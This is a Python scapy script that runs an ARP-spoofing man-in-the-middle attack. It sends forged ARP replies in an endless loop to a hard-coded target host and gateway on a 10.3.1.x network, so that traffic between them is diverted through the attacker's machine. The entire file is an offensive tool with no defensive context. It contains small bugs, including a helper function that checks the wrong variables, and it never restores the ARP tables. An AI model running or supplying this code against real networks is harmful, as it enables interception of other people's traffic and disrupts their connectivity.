import scapy.all as scapy





def spoof(target_ip, target_mac, spoof_ip):
    spoofed_arp_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
    scapy.send(spoofed_arp_packet, verbose = 0)

def get_mac(ip):
    arp_request = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip)
    replay, _ = scapy.srp(arp_request, timeout = 3, verbose = False)
    if replay:
        return replay[0][1].hwsrc
    return None

def mac_found(ip):
    mac = None
    while not target_mac:
        mac = get_mac(target_ip)
        if not mac:
            print("MAC addreass for target not found \n")

    return mac


gateway_ip = "10.3.1.1"
target_ip = "10.3.1.83"

#target_mac = mac_found(target_ip)
#gateway_mac = mac_found(gateway_ip)

target_mac = "cc-2f-71-01-5f-04"
gateway_mac = "34-49-5b-07-9a-27"

while True:
    spoof(target_ip = target_ip ,target_mac = target_mac, spoof_ip=gateway_ip)
    spoof(target_ip = gateway_ip, target_mac = gateway_mac, spoof_ip=target_ip)
    print("spoofing is active") 
    